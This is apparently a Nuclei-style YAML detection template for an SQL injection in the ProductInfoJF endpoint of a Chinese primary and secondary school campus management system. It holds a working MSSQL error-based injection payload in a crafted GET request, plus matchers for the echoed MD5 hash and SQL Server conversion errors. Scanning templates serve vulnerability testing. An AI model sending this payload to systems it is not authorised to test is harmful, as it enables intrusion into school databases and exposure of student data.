id: poc-yaml-scims-productinfojf-sqli
info:
  name: 新中新中小学智慧校园信息管理系统 ProductInfoJF SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(100, 1000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /WeiXin/ProductInfoJF?pdid=-1/sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "0x{{t2}}"
        part: body
      - type: regex
        regex:
          - "转换成数据类型(.*?)时失败"
        part: body
      - type: regex
        regex:
          - "在将(.*?)值"
        part: body
